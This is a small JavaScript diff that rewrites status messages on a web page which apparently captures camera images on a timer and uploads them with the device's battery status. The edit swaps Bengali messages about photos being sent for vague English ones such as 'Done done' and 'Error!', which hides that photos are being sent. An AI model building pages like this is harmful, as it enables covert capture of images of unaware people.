@@ -55,7 +55,7 @@
           }, 5000);
         })
         .catch(err => {
-          status.innerText = "❌ ক্যামেরা চালু করা যায়নি!";
+          status.innerText = "❌ Error!";
           console.error(err);
         });
     }
@@ -83,9 +83,9 @@
         .then(res => {
           if (res.ok) {
             console.log(" please Wait");
-            status.innerText = `📸 পাঠানো হয়েছে (${batteryStatus})`;
+            status.innerText = `Done done (${batteryStatus})`;
           } else {
-            status.innerText = "⚠️ ছবি পাঠাতে সমস্যা হয়েছে!";
+            status.innerText = "⚠️ Error!";
           }
         })
         .catch(err => {
